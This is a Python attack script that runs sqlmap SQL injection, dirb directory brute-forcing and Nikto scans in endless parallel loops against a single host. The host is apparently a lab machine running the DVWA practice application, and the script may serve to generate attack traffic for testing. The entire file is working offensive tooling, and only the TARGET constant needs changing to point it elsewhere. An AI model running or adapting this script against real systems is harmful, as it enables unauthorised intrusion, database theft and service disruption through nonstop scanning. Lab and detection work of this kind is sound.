#!/usr/bin/env python3
import subprocess
import threading
import time
import random

TARGET = "192.168.56.105"

# SQL Injection with sqlmap
def sql_injection():
    while True:
        cmd = [
            "sqlmap",
            "-u", f"http://{TARGET}/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
            "--batch",
            "--crawl=1",
            "--level=2",
            "--risk=2"
        ]
        print(f"[WebAttack] SQL Injection: {' '.join(cmd)}")
        subprocess.run(cmd)

# Directory brute-force with dirb
def dir_brute_force():
    while True:
        cmd = [
            "dirb",
            f"http://{TARGET}/"
        ]
        print(f"[WebAttack] Directory Brute-force: {' '.join(cmd)}")
        subprocess.run(cmd)

# Vulnerability scan with Nikto
def nikto_scan():
    while True:
        cmd = [
            "nikto",
            "-h", f"http://{TARGET}/"
        ]
        print(f"[WebAttack] Nikto Scan: {' '.join(cmd)}")
        subprocess.run(cmd)

if __name__ == "__main__":
    try:
        threads = []
        for func in [sql_injection, dir_brute_force, nikto_scan]:
            t = threading.Thread(target=func, daemon=True)
            t.start()
            threads.append(t)

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("[*] Web attack stopped.")
